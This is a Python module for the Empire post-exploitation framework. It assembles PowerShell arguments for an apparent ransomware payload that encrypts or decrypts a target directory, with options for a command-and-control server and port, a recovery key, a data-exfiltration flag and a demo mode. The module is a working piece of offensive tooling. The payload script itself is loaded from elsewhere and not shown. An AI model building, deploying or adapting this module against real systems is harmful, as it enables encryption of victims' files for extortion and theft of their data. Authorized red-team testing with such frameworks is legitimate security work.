from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source

class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):

        if params["Mode"] == "Encrypt":
            args = f'$args = @(\'-e\', \'{params["Directory"]}\''
        elif params["Mode"] == "Decrypt":
            args = f'$args = @(\'-d\', \'{params["Directory"]}\''

        if params["C2Server"] != "" and params["C2Port"] != "":
            args += (
                f', \'-s\', \'{params["C2Server"]}\', \'-p\', \'{params["C2Port"]}\''
            )

        if params["RecoveryKey"] != "":
            args += f', \'-k\', \'{params["RecoveryKey"]}\''

        if params["Exfiltrate"] == "True":
            args += ", '-x'"

        if params["Demo"] == "True":
            args += ", '-demo'"

        args += ")\n"
        script = args + script

        return script
